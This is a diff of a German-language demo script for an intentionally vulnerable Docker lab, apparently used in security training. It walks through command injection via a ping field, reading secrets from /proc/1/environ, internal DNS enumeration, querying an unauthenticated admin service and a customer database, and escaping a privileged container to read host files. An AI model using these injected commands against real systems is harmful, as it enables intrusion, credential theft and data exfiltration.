@@ -2,7 +2,7 @@
 
 ---
 
-## Schritt 0 — Setup (vor dem Start, nicht live)
+## Schritt 0 — Setup
 
 ### Container starten
 
@@ -53,27 +53,12 @@ Erwartete Ausgabe:
 PING 8.8.8.8 (8.8.8.8): 56 data bytes
 64 bytes from 8.8.8.8: ...
 ```
+
+> 💬 *„Das ist ein normales Diagnose-Tool im Kundenportal — sieht harmlos aus."*
+
 ---
 
-### 1.2 — Sind wir im Container?
-
-> ⚠️ **Geändert:** Der ursprüngliche Befehl `cat /proc/1/cgroup` zeigt auf Systemen mit cgroup v2 nur `0::/` statt eines Docker-Pfads. Der folgende Befehl funktioniert zuverlässig auf allen Systemen.
-
-Im Ping-Feld eingeben:
-
-```
-8.8.8.8; cat /.dockerenv && echo "Wir sind in einem Container"
-```
-
-Erwartete Ausgabe:
-```
-Wir sind in einem Container
-```
-
-> 💬 *„Die Datei /.dockerenv existiert nur innerhalb von Docker-Containern. Damit ist bewiesen: wir befinden uns in einem Container. Jetzt schauen wir was wir von hier aus noch erreichen können."*
----
-
-### 1.3 — Command Injection: Wer bin ich?
+### 1.2 — Command Injection: Wer bin ich?
 
 Im Ping-Feld eingeben:
 
@@ -90,11 +75,73 @@ root
 
 ---
 
+### 1.3 — Sind wir im Container?
+
+> ⚠️ **Hinweis:** Der Befehl `cat /proc/1/cgroup` zeigt auf Systemen mit cgroup v2 nur `0::/` statt eines Docker-Pfads. Der folgende Befehl funktioniert zuverlässig auf allen Systemen.
+
+Im Ping-Feld eingeben:
+
+```
+8.8.8.8; cat /.dockerenv && echo "Wir sind in einem Container"
+```
+
+Erwartete Ausgabe:
+```
+Wir sind in einem Container
+```
+
+> 💬 *„Die Datei /.dockerenv existiert nur innerhalb von Docker-Containern. Damit ist bewiesen: wir befinden uns in einem Container. Jetzt schauen wir was wir von hier aus noch erreichen können."*
+
+---
+
 ## Angriff 2: Lateral Movement
 
 **Was wird gezeigt:** Ein kompromittierter Container kann andere interne Dienste direkt ansprechen, weil keine Netzwerksegmentierung existiert.
 
-### 2.1 — Internen Admin-Service angreifen
+### 2.1 — Umgebung erkunden: Was verrät der Container über sich?
+
+> 💬 *„Ein Angreifer weiß zu diesem Zeitpunkt nicht, welche anderen Systeme es gibt. Sein erster Schritt ist immer: Umgebung erkunden. Umgebungsvariablen sind dabei eine Goldgrube — Entwickler hinterlegen dort oft Hostnamen, Passwörter und Verbindungsdaten."*
+
+Im Ping-Feld eingeben:
+
+```
+; cat /proc/1/environ | tr '\0' '\n'
+```
+
+Erwartete Ausgabe enthält:
+```
+DB_HOST=db
+DB_PASSWORD=root
+SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
+JWT_SECRET=my-super-secret-jwt-signing-key-2024
+```
+
+> 💬 *„Volltreffer. Wir sehen einen Datenbank-Host namens 'db' mit dem Passwort 'root' — und dazu noch API-Keys und ein JWT-Secret im Klartext. Der Angreifer weiß jetzt genau, wo er als nächstes hinmuss."*
+
+---
+
+### 2.2 — Netzwerk scannen: Wer ist noch da?
+
+> 💬 *„Die Umgebungsvariablen haben uns die Datenbank verraten. Aber gibt es noch weitere Services? Docker nutzt einen internen DNS — wir können einfach typische Service-Namen ausprobieren."*
+
+Im Ping-Feld eingeben:
+
+```
+; getent hosts db && getent hosts admin && getent hosts webapp
+```
+
+Erwartete Ausgabe (IP-Adressen der Container):
+```
+172.18.0.3    db
+172.18.0.4    admin
+172.18.0.2    webapp
+```
+
+> 💬 *„Drei Container im selben Netzwerk. Die Datenbank kennen wir schon aus den Env-Vars. Aber 'admin' ist interessant — ein interner Service, der von außen nicht erreichbar ist. Schauen wir mal, was der preisgibt."*
+
+---
+
+### 2.3 — Admin-Service angreifen
 
 Im Ping-Feld eingeben:
 
@@ -114,13 +161,15 @@ Erwartete Ausgabe:
 }
 ```
 
-> 💬 *„Der Admin-Service ist nur im internen Netz — kein Browser weltweit kann ihn direkt aufrufen. Aber weil die Webapp im selben Netz hängt, können wir ihn über Docker-DNS ansprechen und alle API-Keys stehlen."*
+> 💬 *„Der Admin-Service ist nur im internen Netz — kein Browser weltweit kann ihn direkt aufrufen. Aber weil die Webapp im selben Netz hängt, können wir ihn über Docker-DNS ansprechen. Keine Authentifizierung, keine Zugriffskontrolle — alle API-Keys und AWS-Zugangsdaten liegen offen."*
 
 ---
 
-### 2.2 — Datenbank direkt abfragen
+### 2.4 — Datenbank abfragen
 
-> ⚠️ **Geändert:** Der Parameter `--ssl=0` wurde hinzugefügt, da MySQL sonst eine TLS-Fehlermeldung wirft (`ERROR 2026: TLS/SSL error: self-signed certificate in certificate chain`).
+> 💬 *„Aus den Umgebungsvariablen kennen wir Host, User und Passwort. Jetzt greifen wir gezielt auf die Kundendaten zu."*
+
+> ⚠️ **Hinweis:** Der Parameter `--ssl=0` wurde hinzugefügt, da MySQL sonst eine TLS-Fehlermeldung wirft.
 
 Im Ping-Feld eingeben:
 
@@ -136,7 +185,7 @@ id  vorname  nachname  email                        kreditkarte           kontos
 ...
 ```
 
-> 💬 *„Das Datenbankpasswort ist 'root' — und die Webapp hat direkten Netzwerkzugriff auf die DB. Kundendaten, Kreditkarteninformationen — alles in einer Anfrage."*
+> 💬 *„Das Datenbankpasswort stand in den Umgebungsvariablen im Klartext. Die Webapp hat direkten Netzwerkzugriff auf die DB. Kundendaten, Kreditkarteninformationen — alles in einer Anfrage."*
 
 ---
 
@@ -150,7 +199,9 @@ id  vorname  nachname  email                        kreditkarte           kontos
 
 ### 3.1 — Privilegierten Modus erkennen
 
-> ⚠️ **Geändert:** `fdisk` ist im Container nicht installiert. Stattdessen wird `lsblk` verwendet, das zuverlässig funktioniert.
+> 💬 *„Wir haben jetzt Daten aus anderen Containern gestohlen. Aber können wir auch aus dem Container raus — auf das Host-System? Dafür prüfen wir, ob der Container besondere Rechte hat."*
+
+> ⚠️ **Hinweis:** `fdisk` ist im Container nicht installiert. `lsblk` funktioniert zuverlässig.
 
 Im Ping-Feld eingeben:
 
@@ -168,7 +219,7 @@ vda    254:0    0 926.4G  0 disk
                                  /etc/resolv.conf
 ```
 
-> 💬 *„Ein normaler Container sieht keine Festplatten des Hosts. Weil dieser Container mit privileged: true läuft, sehen wir hier die echten Block-Devices des Hosts."*
+> 💬 *„Ein normaler Container sieht keine Festplatten des Hosts. Weil dieser Container mit privileged: true läuft, sehen wir hier die echten Block-Devices des Hosts — und die Partition ist sogar schon unter /mnt/host gemountet."*
 
 ---
 
@@ -194,7 +245,7 @@ Falls `/mnt/host` bereits gemountet ist → direkt zu 3.4.
 
 ### 3.4 — Host-Dateien lesen
 
-> ⚠️ **Geändert:** Unter Docker Desktop enthält die gemountete Partition die Docker-Datenpartition der VM, nicht ein vollständiges Linux-Root-Dateisystem. Daher existieren `/etc/shadow`, `/etc/passwd` etc. dort nicht. Stattdessen zeigen wir die Machine-ID und die Docker-internen Daten.
+> ⚠️ **Hinweis:** Unter Docker Desktop enthält die gemountete Partition die Docker-Datenpartition der VM. Daher existieren `/etc/shadow`, `/etc/passwd` etc. dort nicht. Stattdessen zeigen wir die Machine-ID und die Docker-internen Daten.
 
 Im Ping-Feld eingeben:
 
@@ -216,27 +267,6 @@ buildkit  containers  image  network  overlay2  plugins  runtimes  swarm  tmp  v
 ```
 
 > 💬 *„Wir lesen die Machine-ID des Hosts und sehen die internen Docker-Daten — Images, Volumes, Netzwerke aller Container. Ein Angreifer könnte von hier aus andere Container manipulieren oder Daten extrahieren. Der Container ist ausgebrochen."*
-
----
-
-## Angriff 4: Secrets in Umgebungsvariablen
-
-**Was wird gezeigt:** Passwörter und API-Keys in Env-Vars sind für jeden Prozess im Container lesbar.
-
-### Im Ping-Feld eingeben:
-
-```
-; cat /proc/1/environ | tr '\0' '\n'
-```
-
-Erwartete Ausgabe enthält:
-```
-DB_PASSWORD=root
-SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
-JWT_SECRET=my-super-secret-jwt-signing-key-2024
-```
-
-> 💬 *„Alle Umgebungsvariablen des Prozesses liegen in /proc im Klartext. Das ist die häufigste Art wie Secrets in Docker-Umgebungen übergeben werden — und einer der häufigsten Fehler in der Praxis."*
 
 ---
 
@@ -328,6 +358,5 @@ docker compose -f docker-compose.hardened.yml down
 | `fdisk -l` zeigt nichts | `fdisk` nicht installiert — `lsblk` verwenden |
 | `/mnt/host/etc/shadow` nicht gefunden | Docker Desktop zeigt VM-Datenpartition — `cat /mnt/host/machine-id` und `ls /mnt/host/docker/` verwenden |
 | Device-Name unbekannt | `; lsblk` ausführen und den richtigen Namen ablesen |
-| SSTI zeigt `{{7*7}}` als Text | URL direkt in Adressleiste eingeben, nicht über Formular |
 | Port 5001 nicht erreichbar | `docker compose ps` — läuft webapp? Sonst `docker compose logs webapp` |
 | Gehärtete Version startet nicht | `docker compose down` sicherstellen, dann erneut `up` |
